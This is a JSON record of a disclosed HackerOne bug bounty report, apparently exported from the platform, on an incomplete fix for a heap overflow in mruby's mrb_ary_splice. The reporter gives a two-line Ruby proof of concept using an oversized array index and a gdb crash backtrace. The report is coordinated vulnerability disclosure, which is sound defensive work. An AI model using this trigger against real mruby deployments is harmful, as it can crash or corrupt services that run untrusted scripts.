{
  "id": 197719,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTc3MTk=",
  "url": "https://hackerone.com/reports/197719",
  "title": "Still heap overflow in mrb_ary_splice",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2017-01-12T04:51:40.576Z",
  "submitted_at": "2017-01-12T04:51:40.576Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "tunz",
    "url": "/tunz",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 15668,
    "url": "https://hackerone.com/shopify-scripts",
    "handle": "shopify-scripts",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "shopify-scripts",
      "twitter_handle": "",
      "website": "",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2017-02-07T07:42:20.551Z",
  "bug_reporter_agreed_on_going_public_at": "2017-02-07T07:42:20.507Z",
  "team_member_agreed_on_going_public_at": "2017-02-07T01:28:02.188Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "The fix of #192362 is still crashed with a different PoC. I think the cause of this bug is the same and I missed the incomplete fix, so you may be able to skip rewards for this one.\n\n# Cause\nIf I set the `tail` value to a specific value, then I can maintain the array size. [The original fix](https://github.com/ksss/mruby/commit/caba1a19dc3f9e31612d8439cfa7fbf60d05bbb0) only checks array size, but it still overwrites too many value due to the big `head` value in https://github.com/ksss/mruby/blob/caba1a19dc3f9e31612d8439cfa7fbf60d05bbb0/src/array.c#L630.\n\n# PoC\n(64bits for mrb_int)\n```ruby\nary = Array.new(1024)\nary[0x7ffffffffffffc00,1024] = Array.new(1024)\n```\n\n# gdb\n```\n$ gdb -q --args ./bin/mruby test10.rb\nReading symbols from ./bin/mruby...done.\n(gdb) r\nStarting program: /home/tunz/working/mruby/mruby/bin/mruby test10.rb\n1024\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000000000414878 in ary_fill_with_nil (ptr=0x22e3010, size=9223372036854765361) at /home/tunz/working/mruby/mruby/src/array.c:104\n104         *ptr++ = nil;\n(gdb) bt\n#0  0x0000000000414878 in ary_fill_with_nil (ptr=0x22e3010, size=9223372036854765361)\n    at /home/tunz/working/mruby/mruby/src/array.c:104\n#1  0x00000000004160e6 in mrb_ary_splice (mrb=0x225e010, ary=..., head=9223372036854774784, len=1024, rpl=...)\n    at /home/tunz/working/mruby/mruby/src/array.c:639\n#2  0x00000000004166d3 in mrb_ary_aset (mrb=0x225e010, self=...) at /home/tunz/working/mruby/mruby/src/array.c:821\n#3  0x0000000000430fd5 in mrb_vm_exec (mrb=0x225e010, proc=0x22611b0, pc=0x22c61bc) at /home/tunz/working/mruby/mruby/src/vm.c:1174\n#4  0x000000000042f47b in mrb_vm_run (mrb=0x225e010, proc=0x22611b0, self=..., stack_keep=0)\n    at /home/tunz/working/mruby/mruby/src/vm.c:772\n#5  0x0000000000437599 in mrb_top_run (mrb=0x225e010, proc=0x22611b0, self=..., stack_keep=0)\n    at /home/tunz/working/mruby/mruby/src/vm.c:2491\n#6  0x0000000000447c47 in mrb_load_exec (mrb=0x225e010, p=0x22ba450, c=0x22b90c0)\n    at /home/tunz/working/mruby/mruby/mrbgems/mruby-compiler/core/parse.y:5755\n#7  0x0000000000447cdd in mrb_load_file_cxt (mrb=0x225e010, f=0x22ba090, c=0x22b90c0)\n    at /home/tunz/working/mruby/mruby/mrbgems/mruby-compiler/core/parse.y:5764\n#8  0x00000000004024fc in main (argc=2, argv=0x7fff6c17e5b8)\n    at /home/tunz/working/mruby/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232\n(gdb)\n```",
  "bounty_amount": "800.0",
  "formatted_bounty": "$800",
  "weakness": {
    "id": 48,
    "name": "Denial of Service"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2017-03-09T01:28:02.241Z",
  "allow_singular_disclosure_after": -218804677.11046052,
  "singular_disclosure_allowed": true,
  "vote_count": 3,
  "voters": [
    "mpz",
    "eveeez",
    "spetr0x"
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
